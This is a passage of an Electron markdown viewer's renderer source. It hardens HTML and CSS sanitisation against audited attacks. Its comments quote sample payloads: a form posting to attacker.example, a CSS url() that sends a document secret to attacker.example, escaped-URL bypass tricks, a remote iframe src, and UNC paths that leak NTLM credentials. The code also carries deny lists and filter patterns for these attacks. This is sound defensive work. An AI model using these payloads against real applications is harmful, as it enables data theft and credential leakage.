// ============================================
// IMPORTS
// ============================================
const { ipcRenderer, shell, clipboard } = require('electron');
const fs = require('fs');
const path = require('path');
const { pathToFileURL } = require('url');
if (!window.FoliaDocumentEvents) {
  throw new Error('FoliaDocumentEvents must load before renderer.js');
}
const documentEvents = window.FoliaDocumentEvents;

// Navigation can be cancelled by the first tab activation. Keep its state
// initialized before any startup callback or overlay can reach that path.
let navigationHistory = [];
let navigationIndex = -1;
let navigationRequestSequence = 0;
let pendingNavigationRequest = null;
let acceptedNavigationRequestCount = 0;
let rejectedNavigationRequestCount = 0;
let failedNavigationRequestCount = 0;
let lastNavigationRequestResult = null;

// Helper modules
if (!window.FoliaUtils) {
  throw new Error('FoliaUtils must load before renderer.js');
}
const { removeBOM, getFileName, getDirectory, escapeRegex, formatBytes } = window.FoliaUtils;
if (!window.FoliaMermaidConfig) {
  throw new Error('FoliaMermaidConfig must load before renderer.js');
}
const { getMermaidConfig } = window.FoliaMermaidConfig;
if (!window.FoliaContextMenu) {
  throw new Error('FoliaContextMenu must load before renderer.js');
}
const { positionContextMenu, hideContextMenu: hideContextMenuHelper } = window.FoliaContextMenu;
if (!window.FoliaEmoji) {
  throw new Error('FoliaEmoji must load before renderer.js');
}
const { parseEmojis } = window.FoliaEmoji;

// marked, mermaid and DOMPurify are provided as globals by index.html, which
// loads them from libs/vendor/ (generated by scripts/vendor-libs.js). They are
// deliberately NOT loaded from a CDN - see docs/SECURITY-AUDIT.md SEC-10.

// ============================================
// INITIALIZATION
// ============================================

// Read the persisted theme mode, migrating the legacy key.
//
// Two keys exist: custom-theme.js owns 'themeMode' ('light' | 'dark' |
// 'desktop') and is the source of truth; the upstream toggle writes the legacy
// binary 'darkMode'. They only stay in step because custom-theme.js applies a
// change by *clicking* the upstream toggle - an undocumented dependency that
// silently breaks the moment anything writes 'themeMode' directly. Resolving
// both here, in the same order custom-theme.js uses, removes that coupling and
// closes the ~150ms window at startup during which mermaid was configured from
// the legacy key while the body was about to be themed from the new one.
//
// THIS IS THE ONLY PLACE THAT RULE IS WRITTEN DOWN. It used to be hand-rolled
// at five sites - here, and four `localStorage.getItem('themeMode') ||
// 'desktop'` reads in custom-theme.js - of which only this one honoured the
// legacy key. Measured on a legacy-only profile with the OS resolving light:
// this resolver answered 'dark' while the scheme sites answered 'desktop' ->
// light, so `data-theme` landed on a LIGHT scheme (`parchment`,
// rgb(244,239,228)) over a body carrying `.dark-mode`. That state is not
// reachable today - `applyTheme()` is the only writer of 'themeMode' and
// custom-theme.js's init() calls it unconditionally, so a stored scheme
// implies a stored mode - but it was one deleted migration block away, and the
// divergence itself is real and measurable. Pinned by test:theme section 10k.
function resolveStoredMode() {
  return (
    localStorage.getItem('themeMode') ||
    (localStorage.getItem('darkMode') === 'enabled'
      ? 'dark'
      : localStorage.getItem('darkMode') === 'disabled'
        ? 'light'
        : 'desktop')
  );
}

// Exported explicitly rather than left to rely on a top-level `function`
// declaration implicitly becoming a window property: custom-theme.js is a
// separate classic script and a future `const`/module refactor here would
// otherwise break it silently. test:theme asserts the export exists.
window.resolveStoredMode = resolveStoredMode;

// Resolve the effective dark/light state from the persisted preference.
function resolveDarkPreference() {
  const mode = resolveStoredMode();
  if (mode === 'dark') return true;
  if (mode === 'light') return false;
  return window.matchMedia('(prefers-color-scheme: dark)').matches;
}

// PERF-03: mermaid.min.js is 3.5MB and was parsed on every launch, including
// the majority of launches that open a document with no diagrams at all.
// Measured cost of the eager <script> tag, 7 interleaved cold-cache runs:
// 476ms with vs 347ms without (min; median agreed at 482 vs 354) - about 128ms
// off every single startup, plus the resident heap. It is now fetched the first
// time a diagram actually needs to be drawn.
//
// The theme mermaid should use is tracked separately from mermaid itself. A
// theme toggle can happen before any diagram has ever been seen, and it must
// still be honoured when the bundle finally arrives - otherwise the first
// document containing a diagram renders in the previous theme (white boxes in a
// dark app). See the darkModeToggle handler for why that path must never be
// skipped.
let mermaidDesiredDark = resolveDarkPreference();
let mermaidLoadPromise = null;

function ensureMermaid() {
  if (window.mermaid) return Promise.resolve(window.mermaid);
  if (mermaidLoadPromise) return mermaidLoadPromise;

  mermaidLoadPromise = new Promise((resolve, reject) => {
    const script = document.createElement('script');
    // Relative to the DOCUMENT (src/index.html), not to this file, and libs/ is
    // a sibling of src/ - so this needs the `../` even though renderer.js and
    // index.html live in the same directory.
    script.src = '../libs/vendor/mermaid.min.js';
    script.onload = () => {
      if (!window.mermaid) {
        mermaidLoadPromise = null;
        reject(new Error('mermaid.min.js loaded but did not define mermaid'));
        return;
      }
      mermaid.initialize(getMermaidConfig(mermaidDesiredDark));
      resolve(window.mermaid);
    };
    script.onerror = () => {
      // Drop the cached promise so a later diagram can retry. Keeping a rejected
      // promise here would make one transient failure permanent for the session.
      mermaidLoadPromise = null;
      reject(new Error('Failed to load libs/vendor/mermaid.min.js'));
    };
    document.head.appendChild(script);
  });
  return mermaidLoadPromise;
}

// Configure marked.
// SEC-25: `sanitize` was deprecated in marked 0.7 and REMOVED in v5, so passing
// it here would do nothing at all. It is deleted rather than left as a false
// reassurance - DOMPurify (SANITIZE_CONFIG below) is the sole sanitization
// boundary in this pipeline, and setting `sanitize: true` here would not add one.
//
// `headerIds: true` and `mangle: false` used to be in this block and were
// removed with the marked 9 -> 18 upgrade. They were already inert: both were
// taken out of marked's core in v8/v9 (they live in marked-gfm-heading-id and
// marked-mangle now), so the vendored 9 build silently ignored them, and 18
// ignores them too - measured, it does not throw. They are deleted because a
// dead option that looks live is worse than no option: this one had already
// misled a reader into believing marked was generating heading slugs. It is
// not, and assignHeadingIds() below does that job.
marked.setOptions({
  breaks: true,
  gfm: true
});

// ============================================
// HTML ESCAPING AND SANITIZATION
// ============================================
// The render pipeline builds HTML by string concatenation in several places.
// Historically DOMPurify ran in the *middle* of that process, so every value
// spliced in afterwards reached innerHTML unsanitized - the root cause behind
// SEC-01 through SEC-04 in docs/SECURITY-AUDIT.md. The pipeline now follows
// parse -> assemble -> sanitize -> insert, and every interpolated value is
// escaped at the point of interpolation as well. Both matter: the escaping
// keeps each individual site correct, the ordering makes the guarantee hold
// even for a site someone adds later.

function escapeHtml(value) {
  return String(value === null || value === undefined ? '' : value)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

// Single source of truth for what the sanitizer permits in the DOCUMENT
// pipeline, so the two render paths cannot drift apart again. It is not the
// only config in the file: the table paths use TABLE_SANITIZE_CONFIG below,
// which derives the security-critical settings from this one by reference
// rather than restating them. Claiming to be the single source of truth while
// five call sites quietly used a bare DOMPurify.sanitize() was SEC-29.
const SANITIZE_CONFIG = {
  ADD_TAGS: ['iframe', 'style'],
  ADD_ATTR: [
    'target', 'style', 'class', 'id', 'sandbox', 'srcdoc',
    'data-note-id', 'data-note-title', 'data-note-content', 'data-note-color'
  ],
  // DOMPurify allows <form> and its `action` by default. In a web page that is
  // harmless; here the main window runs with nodeIntegration, so a document
  // containing
  //   <form action="https://attacker.example/pwn.html"><button>View</button></form>
  // is one click from replacing the Node-privileged renderer with an
  // attacker-controlled page. The click handler only intercepts links, so form
  // submission bypasses it entirely.
  //
  // Honest accounting of who does what here: FORBID_TAGS: ['form'] is the
  // load-bearing line. `action` only exists on <form>, so it goes with the tag,
  // and DOMPurify already strips `formaction` from <button>/<input> unaided -
  // both were measured. FORBID_ATTR is therefore forward-defence: it keeps a
  // future edit that re-adds 'form' to ADD_TAGS from quietly reopening this.
  //
  // This is defence in depth, not a complete control: the sanitizer cannot see
  // a navigation the DOM never expressed (window.open, meta refresh, an @@@html
  // frame relocating itself), which is why main.js also denies navigation on
  // the main window. Neither layer is sufficient alone. (SEC-11)
  //
  // `download` is stripped for a related but distinct reason. (SEC-30)
  // It is present in DOMPurify 3.4.12's default ALLOWED_ATTR (measured: 118
  // entries, `download` and `href` in, `target` and `ping` out), and an
  // <a download href="https://..."> is not a navigation - so main.js's
  // will-navigate deny never sees it and CSP has no directive for it. Inside
  // #viewer the attribute is already inert, because every arm of the click
  // delegation calls preventDefault() and routes the link to shell.openExternal
  // or to the local-file policy instead. That invariant only became true with
  // N11: the local-file arm used to test `!hrefAttr.startsWith('http')`, so an
  // href like `httpd.md` matched no arm at all and fell through to Chromium's
  // native follow. Both arms now share one case-insensitive ABSOLUTE_WEB_URL
  // test over complementary inputs, blank hrefs return early, and SVG anchors
  // (whose `href` is an object that used to throw before any preventDefault)
  // are normalised - so every href a sanitized anchor IN #viewer can carry is
  // handled here rather than by the browser. Note the scope: this says nothing
  // about anchors outside #viewer, which is exactly why the attribute is
  // stripped at the sanitizer as well.
  // The reachable surface is #tableInsertPreview, which sits OUTSIDE
  // #viewer and has no delegation: a download anchor rendered there was
  // measured issuing a live outbound request from the Node-privileged renderer.
  // Stripping it here is the layer that prevents the request - main.js's
  // will-download guard only fires once the response has begun, so it stops the
  // file drop, not the beacon. The table preview is covered automatically
  // because TABLE_SANITIZE_CONFIG aliases this array by reference.
  //
  // Frozen because TABLE_SANITIZE_CONFIG aliases both arrays by reference, and
  // because DOMPurify's addToSet lowercases entries back INTO the caller's
  // array unless it is frozen. Both are no-ops today (already lowercase, and
  // nothing pushes to them) - the freeze is what keeps them that way.
  FORBID_TAGS: Object.freeze(['form']),
  FORBID_ATTR: Object.freeze(['action', 'formaction', 'download'])
};

// DOMPurify's default URI allowlist rejects Windows drive paths and file://
// URLs. That is a sensible default for a web page and the wrong one for a local
// markdown viewer, where `![](C:\pics\a.png)` is ordinary usage. Image sources
// matching this pattern are kept explicitly; link hrefs are not, so this does
// not widen SEC-12.
//
// Deliberately narrow: drive-letter paths and file:///<drive> only. Bare UNC
// (\\host\share) and remote file://host/share are NOT accepted, because on
// Windows an <img> pointing at a remote SMB share is fetched automatically and
// can leak the user's NTLM credentials to a host named by untrusted markdown.
// DOMPurify stripped those before this hook existed, and it must keep doing so.
const LOCAL_IMAGE_PATH = /^(?:[a-zA-Z]:[\\/]|file:\/\/\/[a-zA-Z]:[\\/])/i;
const UNC_SEPARATOR = /[\\/]{2}/;

// A UNC path (\\host\share), a protocol-relative URL (//host/share) or a
// file:// URL naming a host all resolve to a remote SMB fetch on Windows.
// DOMPurify keeps the first two by default because they parse as relative
// references, so they are removed explicitly here. <img> is the dangerous case
// because the fetch happens with no user interaction, which is enough to hand
// the user's NTLM credentials to a host chosen by whoever wrote the markdown.
const REMOTE_SHARE_PATH = /^(?:[\\/]{2}|file:\/\/(?!\/))/i;

function isLocalImagePath(value) {
  const src = String(value || '').trim();
  if (!LOCAL_IMAGE_PATH.test(src)) return false;
  // Reject anything that smuggles a UNC path in behind a local-looking prefix,
  // e.g. "file:///\\\\host\\share\\x.png" or "C:/\\/host/share".
  //
  // This deliberately also rejects the rare "C:\\pics\\a.png" doubled-separator
  // form that Chromium would otherwise resolve locally. Keeping the guard blunt
  // is worth more than supporting a spelling that effectively never appears in
  // markdown.
  return !UNC_SEPARATOR.test(src.replace(/^file:\/\/\//i, ''));
}

// Anything of the form `scheme:` - data:, http:, https:, file:, blob:, and also
// a bare Windows drive letter, which really is a valid URL scheme as far as the
// parser is concerned. Used only to decide "is this src relative", so treating
// `C:` as a scheme is the right answer here rather than a quirk to work around.
const HAS_URL_SCHEME = /^[a-z][a-z0-9+.\-]*:/i;

// Resolve a document-relative <img src> against the directory of the file being
// viewed, returning a file:// URL - or null if the src is not document-relative
// and must be left exactly as it is.
//
// Relative *links* already do this (see the anchor handler, which resolves
// against path.dirname(currentFilePath)); relative *images* did not, so they
// resolved against document.baseURI - which is index.html *inside the asar* -
// and silently never loaded. Measured on the real open path: naturalWidth 0 for
// `![](shots/a.png)`, for `./shots/b.png` and for raw `<img src>` alike.
//
// Resolution goes through the URL parser rather than string concatenation
// because marked percent-encodes the src it emits: `shots/my pic.png` in the
// markdown arrives here as `shots/my%20pic.png`, and `hash#tag.png` as
// `hash%23tag.png`. Hand-joining those onto a directory produces a path with a
// literal `%20` in it. `new URL(src, base)` decodes, resolves `.`/`..` and
// re-encodes in one step, with no assumptions about which forms marked emits.
//
// This grants no new read capability: an absolute `C:/…` src already resolves
// and loads today (measured), so a document could always name a local file.
function resolveDocumentRelativeImageSrc(src, docPath) {
  const value = String(src || '').trim();
  if (!value || !docPath) return null;
  // A fragment-only src names no image at all. Resolving it would bake the
  // document's own absolute path into the attribute - and from there into the
  // exported PDF - to no purpose. (Reported in review.)
  if (value.startsWith('#')) return null;
  // Absolute local paths and anything already carrying a scheme are left alone.
  if (isLocalImagePath(value) || HAS_URL_SCHEME.test(value)) return null;
  // Belt and braces: uponSanitizeAttribute drops these before this runs.
  if (REMOTE_SHARE_PATH.test(value)) return null;

  let resolved;
  try {
    const tab = window.CustomTabs?.getTabs().find(candidate =>
      candidate.filePath === docPath);
    const descriptor = tab && window.CustomTabs.getDocumentDescriptor(tab.id);
    resolved = new URL(value, descriptor?.documentUrl || pathToFileURL(docPath));
  } catch {
    return null;
  }
  // `//host/share/x.png` resolves to a file: URL with a HOST, which on Windows
  // is an outbound SMB fetch and an NTLMv2 leak (SEC-12). The resolver must
  // never be the thing that reintroduces it, whatever reaches it upstream.
  if (resolved.protocol !== 'file:' || resolved.host !== '') return null;
  return resolved.href;
}

// The value the *document author* wrote, which is what the note
// features search the markdown source for. Those features rebuild `![alt](src)`
// and look for it verbatim, so they must never see the resolved absolute URL.
function authoredImageSrc(el) {
  if (!el || typeof el.getAttribute !== 'function') return '';
  return el.getAttribute('data-original-src') || el.getAttribute('src') || '';
}

// ...but the authored *attribute* is still not the authored *markdown*. marked
// normalises the destination on its way into the attribute:
//
//   ![a](<shots/my pic.png>)   ->  src="shots/my%20pic.png"
//   ![a](<shots/hash#tag.png>) ->  src="shots/hash%23tag.png"
//
// so `![alt](` + attribute + `)` simply does not occur in the source text, and
// the note feature reported "Could not find image in source" for
// any image whose path contains a space or a #. That predates the relative-path
// resolution and is unrelated to it - it is a property of marked's output - but
// it is the same "the src string is not what you think it is" mistake, so it is
// fixed here rather than left as a trap for the next reader.
//
// Candidates are ordered most-literal first, so a document that really does
// spell the destination the encoded way still matches on the first try.
function markdownImageCandidates(alt, src) {
  const out = [];
  const push = (dest) => {
    if (!dest) return;
    const pattern = `![${alt}](${dest})`;
    if (!out.includes(pattern)) out.push(pattern);
  };
  let decoded = null;
  try {
    decoded = decodeURIComponent(src);
  } catch {
    // A malformed escape (`%zz`) is not an error here: it just means the
    // attribute was never percent-encoded, so there is no decoded spelling.
    decoded = null;
  }
  push(src);
  push(`<${src}>`);
  if (decoded && decoded !== src) {
    push(decoded);
    push(`<${decoded}>`);
  }
  return out;
}

// Locate `![alt](dest)` in `content` for an image whose rendered src attribute
// is `src`, trying each spelling marked could have normalised into it.
// Returns { index, pattern } or null.
function findMarkdownImage(content, alt, src) {
  for (const pattern of markdownImageCandidates(alt, src)) {
    const index = content.indexOf(pattern);
    if (index !== -1) return { index, pattern };
  }
  return null;
}

// SEC-21: `style` is in ADD_TAGS/ADD_ATTR and cannot simply be removed - the
// notes feature, the theme system and upstream's own markdown all depend on
// inline styles. That leaves CSS as a fetch surface the link policy never sees:
//
//   <div style="background-image:url(https://attacker.example/?doc=secret)">
//
// needs no click and no script. The main-window CSP does not stop it either,
// because `img-src https:` is deliberately open so that ordinary documents can
// show remote images. So the URLs *inside* CSS are filtered here instead.
//
// CSS allows `\68 ttps:` numeric escapes AND `\<newline>` line continuations
// inside a string, so the value is decoded before it is judged; testing the raw
// text would be trivially bypassed.
//
// The line-continuation branch is load-bearing and was missing in the first
// version of this filter: per CSS Syntax L3 4.3.5 a backslash followed by a
// newline inside a string is consumed and produces *nothing*, so
// `url("ht\<LF>tps://evil/")` is `https://evil/` to Chromium. Decoding it to
// anything other than the empty string - including leaving it alone - lets that
// straight through.
const CSS_ESCAPE =
  /\\([0-9a-fA-F]{1,6})[ \t\r\n\f]?|\\(\r\n|[\r\n\f])|\\([^\r\n\f])/g;
function decodeCssEscapes(value) {
  return String(value == null ? '' : value).replace(
    CSS_ESCAPE,
    (m, hex, newline, ch) => {
      if (newline !== undefined) return '';
      if (hex === undefined) return ch;
      const code = parseInt(hex, 16);
      // 0 and lone surrogates are not representable; CSS maps them to U+FFFD.
      if (!code || (code >= 0xd800 && code <= 0xdfff) || code > 0x10ffff) return '\uFFFD';
      return String.fromCodePoint(code);
    },
  );
}

const CSS_ANY_SCHEME = /^[a-z][a-z0-9+.-]*:/i;
// SVG is excluded on purpose: a data: SVG is a document that can carry script,
// not just pixels.
const CSS_INERT_DATA_IMAGE = /^data:image\/(?:png|jpe?g|gif|webp|bmp|x-icon|vnd\.microsoft\.icon);/i;

function isSafeCssUrl(raw) {
  const value = decodeCssEscapes(raw).trim();
  if (!value) return false;
  // //host/share, file://host/share - a silent SMB fetch on Windows, i.e. the
  // NTLM leak guarded against for <img> above.
  if (REMOTE_SHARE_PATH.test(value)) return false;
  if (CSS_INERT_DATA_IMAGE.test(value)) return true;
  if (isLocalImagePath(value)) return true;
  // Anything else carrying a scheme is remote (http:, https:, blob:, javascript:).
  if (CSS_ANY_SCHEME.test(value)) return false;
  // No scheme: a relative path, resolved against the local document.
  return true;
}

// The unquoted branch must treat a hex escape as one unit: CSS terminates
// `\68` with an optional whitespace character, so `url(\68 ttps://evil/)` is a
// single token containing a space. Matching `[^)\s]` greedily instead stops at
// that space, the token never matches, and the value sails through unfiltered -
// which is exactly what the SEC-21 escape test caught.
const CSS_HEX_ESCAPE = String.raw`\\[0-9a-fA-F]{1,6}[ \t\r\n\f]?`;
const CSS_URL_TOKEN = new RegExp(
  String.raw`url\(\s*(?:"((?:[^"\\]|\\[\s\S])*)"|'((?:[^'\\]|\\[\s\S])*)'|((?:` +
    CSS_HEX_ESCAPE +
    String.raw`|\\[\s\S]|[^)\\\s])*))\s*\)`,
  'gi',
);
// image-set() and @font-face `src:` take a bare quoted string with no url()
// wrapper, so they are a second, independent way to name a remote resource.
const CSS_IMAGE_SET = /(-webkit-)?image-set\(([^)]*)\)/gi;
const CSS_BARE_STRING = /"((?:[^"\\]|\\[\s\S])*)"|'((?:[^'\\]|\\[\s\S])*)'/g;
// @import can pull in a remote stylesheet without url(). The main-window CSP
// (`style-src 'self' 'unsafe-inline'`) already refuses this, but the popup and
// export surfaces do not all share that policy, so it is removed at source.
const CSS_IMPORT_RULE = /@import\b[^;{]*(?:;|$)/gi;

const CSS_BLOCKED_URL = 'about:blank';

function sanitizeCssText(css) {
  const text = String(css == null ? '' : css);
  if (!text) return text;
  return text
    .replace(CSS_IMPORT_RULE, '')
    .replace(CSS_IMAGE_SET, (match, prefix, body) =>
      `${prefix || ''}image-set(${body.replace(CSS_BARE_STRING, (m, dq, sq) => {
        const raw = dq !== undefined ? dq : sq;
        return isSafeCssUrl(raw) ? m : `"${CSS_BLOCKED_URL}"`;
      })})`)
    .replace(CSS_URL_TOKEN, (match, dq, sq, bare) => {
      const raw = dq !== undefined ? dq : sq !== undefined ? sq : bare;
      return isSafeCssUrl(raw) ? match : `url("${CSS_BLOCKED_URL}")`;
    });
}

// Hand-written CSS tokenising is a losing game: the first version of this
// filter was defeated by a backslash-newline line continuation, because the
// regex judged text that Chromium would go on to parse differently. Rather than
// keep patching the tokeniser, the string is first run through Chromium's own
// parser and read back in canonical form. Escapes are resolved, `image-set("x")`
// becomes `image-set(url("x"))`, quoting is normalised, and unparseable
// declarations are dropped exactly as they would be at render time. Whatever
// comes out is, by construction, what the engine will act on - so the filter and
// the engine can no longer disagree about what a value says.
//
// Both probes below are detached from the document and never adopted, so
// parsing them fetches nothing.
function normalizeCssDeclarations(css) {
  const text = String(css == null ? '' : css);
  if (!text) return text;
  try {
    const probe = document.createElement('div');
    probe.style.cssText = text;
    // An empty result means the engine rejected everything. Returning the
    // original text keeps the regex pass below as the control rather than
    // silently discarding a document's styling on a parser quirk.
    return probe.style.cssText || text;
  } catch (e) {
    return text;
  }
}

function normalizeCssStyleSheet(css) {
  const text = String(css == null ? '' : css);
  if (!text) return text;
  try {
    const sheet = new CSSStyleSheet();
    // replaceSync ignores @import by specification - which also disposes of
    // escaped spellings such as `@\69mport` that a regex would have to
    // enumerate.
    sheet.replaceSync(text);
    const rules = Array.from(sheet.cssRules, (r) => r.cssText).join('\n');
    return rules || '';
  } catch (e) {
    return text;
  }
}

// Custom properties are the one thing the normaliser above does NOT canonicalise
// - they are stored as raw token streams, so `--x: url("ht\<LF>tps://evil/")`
// survives verbatim and `background-image: var(--x)` then resolves it to a live
// URL. Measured directly, not assumed. That is why the regex pass still runs
// after normalisation instead of being replaced by it.
function filterCssDeclarations(css) {
  return sanitizeCssText(normalizeCssDeclarations(css));
}

function filterCssStyleSheet(css) {
  return sanitizeCssText(normalizeCssStyleSheet(css));
}

let sanitizerHooksInstalled = false;
function installSanitizerHooks() {
  if (sanitizerHooksInstalled) return;
  sanitizerHooksInstalled = true;

  // Any iframe that survives sanitization is forced into an opaque origin.
  // A srcdoc iframe inherits the embedder's origin, which in this app means a
  // frame with nodeIntegration reachable through window.parent.require - the
  // SEC-01 escalation. `allow-scripts` without `allow-same-origin` still runs
  // the frame's scripts (so @@@html blocks and their resize postMessage keep
  // working) while denying it any access to the parent document.
  DOMPurify.addHook('afterSanitizeAttributes', (node) => {
    // localName, not tagName: tagName is upper-cased only for HTML-namespace
    // elements. An SVG <style> reports tagName 'style' in lower case, so
    // comparing against 'STYLE' skipped SVG stylesheets entirely - and DOMPurify
    // keeps SVG by default, so `<svg><style>…url(https://evil)…</style></svg>`
    // in ordinary markdown went completely unfiltered. Measured, not assumed.
    const tag = node.localName ? String(node.localName).toLowerCase() : '';
    if (tag === 'iframe') {
      node.setAttribute('sandbox', 'allow-scripts');
      // The only iframe this app intends to produce is the @@@html block, which
      // is built from `srcdoc`. A `src` therefore never comes from us - and
      // DOMPurify keeps it, because `src` is allowed by default and `iframe` is
      // in ADD_TAGS. Left alone, `<iframe src="https://attacker/">` in ordinary
      // markdown fetches and runs a remote page inside the main window with no
      // click at all: a silent IP/User-Agent beacon at minimum. main.js also
      // denies subframe navigation, which blocks the load, but the element
      // should not exist in the first place. (SEC-11)
      node.removeAttribute('src');
    }
    // SEC-21: filter CSS URLs on both surfaces that carry them - the `style`
    // attribute and the text inside a `<style>` element. This runs in
    // afterSanitizeAttributes rather than uponSanitizeAttribute so the value
    // read here is the one DOMPurify has already accepted and normalised.
    if (node.hasAttribute && node.hasAttribute('style')) {
      const raw = node.getAttribute('style');
      const safe = filterCssDeclarations(raw);
      if (safe !== raw) node.setAttribute('style', safe);
    }
    if (tag === 'style') {
      const raw = node.textContent;
      const safe = filterCssStyleSheet(raw);
      if (safe !== raw) node.textContent = safe;
    }
    // Resolve document-relative image sources against the file being viewed.
    // This is the single choke point for both markdown `![](…)` images and raw
    // `<img src>` in the document, which is why it lives here rather than in
    // the marked renderer. The authored value is preserved on the element,
    // because the note feature searches the markdown source for it.
    if (tag === 'img' && node.hasAttribute('src')) {
      const raw = node.getAttribute('src');
      const resolved = resolveDocumentRelativeImageSrc(raw, currentFilePath);
      if (resolved) {
        node.setAttribute('data-original-src', raw);
        node.setAttribute('src', resolved);
      }
    }
  });

  // Keep local image paths the default allowlist would drop, and drop remote
  // ones it would keep. Note that DOMPurify hooks are global: these apply to
  // every DOMPurify.sanitize() call in the renderer, not only to
  // sanitizeHtml(). That is intended - the other call sites (the table
  // renderer and the table dialog preview, both via sanitizeTableHtml below)
  // want the same image handling - and it is why the hooks are kept this
  // narrow. NOT because that input is trusted: the dialog's 'edit' path is fed
  // from the open document, so it is attacker-controlled too. Believing
  // otherwise is what let SEC-29 survive; see the note on sanitizeTableHtml.
  DOMPurify.addHook('uponSanitizeAttribute', (node, data) => {
    if (node.tagName !== 'IMG' || data.attrName !== 'src') return;
    const src = String(data.attrValue || '').trim();
    if (REMOTE_SHARE_PATH.test(src)) {
      data.keepAttr = false;
      return;
    }
    if (isLocalImagePath(src)) {
      data.forceKeepAttr = true;
    }
  });
}
installSanitizerHooks();

function sanitizeHtml(html) {
  return DOMPurify.sanitize(html, SANITIZE_CONFIG);
}

// The table dialogs and the context-menu table renderer parse and sanitize
// markdown of their own, and used to do it with a bare DOMPurify.sanitize() -
// which silently opted out of SANITIZE_CONFIG, and therefore out of the SEC-11
// <form> control. The global hooks still applied (they are registered on the
// DOMPurify instance, not per call), so the image handling was right and only
// the config was missing, which is exactly why it went unnoticed. (SEC-29)
//
// Reachability, measured: renderTableInDOM extracts only the <table> element
// from its scratch div, so a <form> that is a SIBLING of the table is dropped
// by the extraction - but one nested inside a table CELL travels with the
// table and is appended into the Node-privileged viewer. The dialog preview is
// a live element in that window too, and its 'edit' path is fed from the open
// document, so its input is attacker-controlled as well.
//
// Deliberately NOT sanitizeHtml(). That config serves the document pipeline
// and adds <iframe> plus srcdoc/sandbox/target; a table preview needs none of
// them, and the global afterSanitizeAttributes hook force-sandboxes every
// iframe with allow-scripts, so reusing it would newly hand attacker-controlled
// markdown a script-running frame in the previews. (<style>, class, id and
// style are already in DOMPurify's own default allowlists, so they are NOT
// part of that config's delta - measured against the vendored build's tag and
// attribute sets rather than inferred from reading ADD_TAGS/ADD_ATTR.)
//
// Only the security-critical settings are shared, and they are taken from
// SANITIZE_CONFIG by reference so that adding a tag there can never leave this
// path behind again. Everything else stays on DOMPurify's defaults, which is
// what these sites already had.
//
// The behavioural delta is therefore exactly two things: <form> is unwrapped,
// and `action` is dropped from EVERY element. DOMPurify's attribute allowlist
// is global rather than per-tag and `action` is in its defaults, so this does
// narrow slightly beyond <form>. Kept rather than trimmed back: `action` on a
// non-form element is inert HTML, and keeping the two deny-lists identical is
// the whole mechanism behind the forward-defence above. `formaction` is absent
// from DOMPurify's defaults entirely, so that entry is forward-defence only.
const TABLE_SANITIZE_CONFIG = {
  FORBID_TAGS: SANITIZE_CONFIG.FORBID_TAGS,
  FORBID_ATTR: SANITIZE_CONFIG.FORBID_ATTR
};

function sanitizeTableHtml(html) {
  return DOMPurify.sanitize(html, TABLE_SANITIZE_CONFIG);
}

// The @@@html fence, in ONE place because the light-format and full render
// paths both parse it and silently diverging is a recurring defect class here.
//
// The tolerances are not cosmetic. The original `@@@html[\r\n]+` required the
// opening fence to be the last thing on its line, so a single trailing SPACE -
// which nothing in the editor shows and no error reports - made the block fail
// to match. The raw HTML then went through marked and DOMPurify as ordinary
// inline markup instead of into its sandboxed frame: scripts stripped, layout
// mangled, and no diagnostic anywhere. Measured on the real regex: 'plain' and
// CRLF matched, 'trailing space', 'trailing tab' and an indented closing fence
// all did not.
//
// The optional (...) group is ACCEPTED AND IGNORED deliberately. Upstream uses
// it to carry a per-block zoom, which is a feature decision this fork has not
// taken; but refusing to parse the syntax at all means such a document dumps
// its raw HTML into the page as prose, which is strictly the worse failure.
// Matching it costs nothing and contains the blast radius to "the zoom hint was
// not honoured" rather than "the document is wrecked".
const RAW_HTML_FENCE = /@@@html(?:\([^)\r\n]*\))?[ \t]*[\r\n]+([\s\S]*?)[\r\n][ \t]*@@@[ \t]*/g;

function eachRawHtmlBlock(content, replacer) {
  RAW_HTML_FENCE.lastIndex = 0;
  return content.replace(RAW_HTML_FENCE, (match, code) => replacer(code));
}


// author HTML, and DOMPurify will not carry it: it drops a `srcdoc` attribute
// whose value contains a <script>, which ours always does (the resize
// notifier). Rather than sanitize the block - which would defeat the feature -
// the iframe is emitted *without* srcdoc so it passes through the sanitizer,
// and the document is attached afterwards with setAttribute.
//
// That is deliberately not a return to string-splicing after sanitization: no
// attacker-controlled text is concatenated into an HTML string here, and the
// frame is pinned to `sandbox="allow-scripts"` with no `allow-same-origin`, so
// it has an opaque origin and cannot reach window.parent (SEC-01). Scripts
// inside it still run, and postMessage back to the host still works, which is
// what the feature needs.
//
// Frames are keyed by a hash of the block's own content rather than by their
// position, for two reasons. A positional index is forgeable - markdown can
// author <iframe class="raw-html-block" data-rawhtml-idx="0"> directly, and it
// survives sanitization - and it is unstable, so a frame left over from a
// previously rendered document could keep displaying that document's raw HTML
// after patchViewerDOM() reused the node. Keying by content means a frame can
// only ever receive the block it was generated from, and any frame without a
// matching entry in the current render has its srcdoc removed.
let rawHtmlDocuments = new Map();

function buildRawHtmlDocument(code) {
  return [
    '<!DOCTYPE html><html><head>',
    '<meta charset="UTF-8">',
    '<style>html,body{margin:0;padding:0;}</style>',
    '</head><body>',
    code,
    '<scr' + 'ipt>',
    'window.addEventListener("load",function(){',
    '  function notify(){window.parent.postMessage({type:"folia-rawhtml-resize",h:document.body.scrollHeight},"*");}',
    '  setTimeout(notify,100);setTimeout(notify,600);setTimeout(notify,1500);',
    '});',
    '</scr' + 'ipt>',
    '</body></html>'
  ].join('');
}

// Registers the block's document and returns the iframe markup that will carry
// it. Call once per @@@html block, per render.
//
// The key is a 32-bit content hash chosen for stable DOM identity across
// renders, not for collision resistance. Markdown can compute it, and two
// blocks can be crafted to collide. Neither matters: both blocks would come
// from the same author in the same document, so the worst case is that author
// substituting their own content. What makes an @@@html block safe to render at
// all is the opaque-origin sandbox, not this key.
function rawHtmlIframeMarkup(code) {
  const key = _blockHash(code);
  const existing = rawHtmlDocuments.get(key);
  if (existing) {
    // Two byte-identical blocks in one document legitimately need two frames.
    existing.count += 1;
  } else {
    rawHtmlDocuments.set(key, { doc: buildRawHtmlDocument(code), count: 1 });
  }
  return `<iframe class="raw-html-block" data-rawhtml-key="${escapeHtml(key)}" sandbox="allow-scripts" style="width:100%;border:none;display:block;min-height:50px;"></iframe>`;
}

// Re-attach srcdoc after every DOM patch. Only written when it actually differs,
// because assigning srcdoc reloads the frame and would otherwise restart the
// embedded document on each render.
//
// The key is derived from public content, so markdown can name a key that
// belongs to a real block in the same document. Each key therefore only funds
